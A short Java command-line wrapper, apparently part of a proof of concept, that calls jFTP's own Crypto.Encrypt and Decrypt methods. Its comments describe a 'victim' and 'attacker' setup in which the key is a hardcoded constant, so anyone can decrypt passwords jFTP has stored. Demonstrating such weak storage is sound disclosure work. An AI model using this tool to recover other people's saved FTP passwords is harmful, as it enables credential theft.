// CryptoCli.java
//
// Thin command-line wrapper around jFTP's *actual*, unmodified
// net.sf.jftp.config.Crypto class (see jftp/src/java/net/sf/jftp/config/Crypto.java).
//
// It does not reimplement or alter jFTP's crypto in any way - it just gives the
// shell script a way to call the real Encrypt()/Decrypt() methods that jFTP ships
// with, which is exactly what the "victim" jFTP client and the "attacker" both
// have access to, since the key material is a hardcoded constant baked into the
// open-source jar/class files, not a secret derived from anything per-install.
//
// Usage:
//   java -cp <classes> CryptoCli encrypt "plaintext password"
//   java -cp <classes> CryptoCli decrypt "base64 ciphertext"

import net.sf.jftp.config.Crypto;

public class CryptoCli {
    public static void main(String[] args) {
        if (args.length != 2) {
            System.err.println("usage: CryptoCli <encrypt|decrypt> <value>");
            System.exit(2);
        }

        String mode = args[0];
        String value = args[1];

        if (mode.equals("encrypt")) {
            System.out.println(Crypto.Encrypt(value));
        } else if (mode.equals("decrypt")) {
            System.out.println(Crypto.Decrypt(value));
        } else {
            System.err.println("unknown mode: " + mode);
            System.exit(2);
        }
    }
}
